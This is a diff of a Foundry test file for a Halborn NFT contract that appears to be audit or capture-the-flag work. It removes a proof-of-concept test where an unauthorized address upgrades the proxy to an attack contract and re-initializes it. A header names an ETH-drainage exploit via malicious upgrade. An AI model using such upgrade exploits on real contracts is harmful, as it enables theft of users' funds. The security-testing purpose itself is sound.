@@ -187,28 +187,6 @@ contract HalbornNFT_Test is Test, Merkle {
         assertEq(nft.price(), newPrice);
     }
 
-    // Medium Bug 10: idCounter increment is unchecked
-    function test_overflowCounter() public {
-        address unauthorizedUser = address(0xdead);
-        vm.startPrank(unauthorizedUser);
-
-        NFT_UUPSattack attack = new NFT_UUPSattack();
-        nft.upgradeTo(address(attack));
-        nft.initialize("", 1);
-
-        assertEq(nft.price(), 1);
-        // this is just an example, but completely infeasable to do
-        // becasue the max stack depth in solidity is 1024
-        // it would take 1.157920892373162e+77 iterations to overflow
-        // which is completely infeasable to do
-        // but theoretically possible
-        /*         
-        for(uint256 i = 0; i < type(uint).max; i++) {
-            nft.mintBuyWithETH{value: 1 ether}();
-        } 
-        */
-    }
-
     // Critical Exploit 4: anyone can steal to ETH in contract
     /**
      * @dev EXPLOIT: ETH Drainage Attack via Malicious Upgrade
